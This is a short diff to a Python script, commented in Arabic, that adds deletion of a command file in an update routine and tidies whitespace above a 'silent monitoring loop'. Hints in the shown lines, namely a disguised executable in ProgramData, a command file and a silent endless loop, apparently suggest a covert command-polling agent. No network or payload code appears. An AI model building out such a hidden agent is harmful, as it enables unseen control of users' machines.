@@ -92,6 +92,9 @@ PYTHON_EXEC   = Path(r"C:\ProgramData\MOS\python_platform.exe")
 
 def update():
     try:
+        # حذف CMD_FILE لتجنب التكرار
+        if os.path.exists(CMD_FILE):
+            os.remove(CMD_FILE)
         # 1️⃣ حذف الملف القديم إذا كان موجودًا
         if CROSSMOS_PATH.exists():
             CROSSMOS_PATH.unlink()
@@ -122,7 +125,7 @@ def update():
     except Exception as e:
         print(f"[!] Update failed: {e}")
 
-        
+
 # حلقة المراقبة الصامتة
 if not os.path.exists(BASE_DIR): os.makedirs(BASE_DIR)
 while True:
